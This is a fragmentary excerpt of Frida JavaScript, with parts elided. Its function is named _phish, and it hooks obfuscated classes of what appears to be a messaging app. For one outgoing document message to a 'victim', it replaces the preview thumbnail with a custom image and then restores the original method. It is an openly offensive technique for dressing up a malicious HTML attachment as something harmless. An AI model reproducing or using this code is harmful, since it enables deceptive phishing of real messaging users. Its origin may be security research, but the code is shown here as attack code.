...
function _phish(victim_jid, html_filename, thumbnail_filename, media_caption) {
    ...
    Java.perform(function() {
        ...
        var MessageUtils = Java.use("X.0bb");
        var FMessage = Java.use("X.041");
        var FMessageMedia = Java.use("X.0Nd");
        var MediaSender = Java.use("X.0M6");
        ...
        try {
            ...
            // message to be sent can be found in the first argument and can be
            ...
            //
            var implementation = MessageUtils.A0E.implementation;

            //
            // Install new hook that modifies the message preview.
            //
            MessageUtils.A0E.implementation = function(fMessage, unknown) {
                ...
                //
                if(type == 9) {
                    fMessage._A0L.value._A03.value = customThumbnail;
                ...
                //
                var ret = this.A0E(fMessage, unknown);

                //
                // Remove this hook, so that further outgoing document messages
                // are not modified.
                //
                MessageUtils.A0E.implementation = implementation;
